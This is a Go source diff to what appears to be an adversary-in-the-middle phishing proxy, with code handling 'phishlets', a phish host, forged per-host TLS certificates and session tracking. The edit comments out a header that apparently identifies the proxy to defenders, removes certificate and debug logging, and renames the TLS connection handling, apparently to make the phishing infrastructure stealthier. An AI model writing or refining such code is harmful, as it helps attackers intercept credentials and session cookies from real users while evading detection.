@@ -477,7 +477,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 						return p.blockRequest(req)
 					}
 				}
-				req.Header.Set(p.getHomeDir(), o_host)
+				// req.Header.Set(p.getHomeDir(), o_host)
 
 				if ps.SessionId != "" {
 					if s, ok := p.sessions[ps.SessionId]; ok {
@@ -1540,9 +1540,7 @@ func (p *HttpProxy) patchUrls(pl *Phishlet, body []byte, c_type int) []byte {
 }
 
 func (p *HttpProxy) TLSConfigFromCA() func(host string, ctx *goproxy.ProxyCtx) (*tls.Config, error) {
-	fmt.Println("TLSConfigFromCA")
 	return func(host string, ctx *goproxy.ProxyCtx) (c *tls.Config, err error) {
-		fmt.Println("TLSConfigFromCA => 1st func")
 		parts := strings.SplitN(host, ":", 2)
 		hostname := parts[0]
 		port := 443
@@ -1571,10 +1569,8 @@ func (p *HttpProxy) TLSConfigFromCA() func(host string, ctx *goproxy.ProxyCtx) (
 			// declare cert as *tls.Certificate
 			var cert *tls.Certificate
 			if p.CertFilePath != "" && p.KeyFilePath != "" {
-				log.Info("Using custom certificate and key files: %s, %s", p.CertFilePath, p.KeyFilePath)
 				cert, err = p.crt_db.getCertificateFromDisk(hostname, phish_host, port, p.CertFilePath, p.KeyFilePath)
 			} else {
-				log.Info("Generating/Using self-signed certificate for %s", hostname)
 				cert, err = p.crt_db.getSelfSignedCertificate(hostname, phish_host, port)
 			}
 
@@ -1623,6 +1619,8 @@ func (p *HttpProxy) setSessionCustom(sid string, name string, value string) {
 func (p *HttpProxy) httpsWorker() {
 	var err error
 
+	// port := strings.Split(p.Server.Addr, ":")[1]
+
 	p.sniListener, err = net.Listen("tcp", p.Server.Addr)
 	if err != nil {
 		log.Fatal("%s", err)
@@ -1642,14 +1640,14 @@ func (p *HttpProxy) httpsWorker() {
 			c.SetReadDeadline(now.Add(httpReadTimeout))
 			c.SetWriteDeadline(now.Add(httpWriteTimeout))
 
-			tlsConn, err := vhost.TLS(c)
-			// make it use only http without tls
-			// tlsConn, err := vhost.HTTP(c)
+			// httpSConn, err := vhost.HTTP(c)
+			httpSConn, err := vhost.TLS(c)
+
 			if err != nil {
 				return
 			}
 
-			hostname := tlsConn.Host()
+			hostname := httpSConn.Host()
 			// cut the port number from the hostname
 			if strings.Contains(hostname, ":") {
 				hostname = strings.Split(hostname, ":")[0]
@@ -1670,12 +1668,13 @@ func (p *HttpProxy) httpsWorker() {
 				URL: &url.URL{
 					Opaque: hostname,
 					Host:   net.JoinHostPort(hostname, "443"),
+					//Host: net.JoinHostPort(hostname, port),
 				},
 				Host:       hostname,
 				Header:     make(http.Header),
 				RemoteAddr: c.RemoteAddr().String(),
 			}
-			resp := dumbResponseWriter{tlsConn}
+			resp := dumbResponseWriter{httpSConn}
 			p.Proxy.ServeHTTP(resp, req)
 		}(c)
 	}
